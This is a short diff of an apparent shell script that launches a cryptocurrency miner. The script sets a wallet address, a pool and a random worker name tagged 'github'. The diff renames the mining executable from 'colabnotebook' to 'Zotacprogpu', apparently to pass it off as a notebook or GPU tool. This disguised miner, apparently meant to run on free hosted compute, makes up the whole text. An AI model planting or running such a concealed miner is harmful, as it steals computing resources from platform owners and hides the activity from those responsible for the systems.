@@ -4,4 +4,4 @@ WALLET=TRX:TYUe8MUn4usSpfeUruvh5ddS5cM7SETor5
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-github#t7zm-x25s)
 
 
-./colabnotebook --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./Zotacprogpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
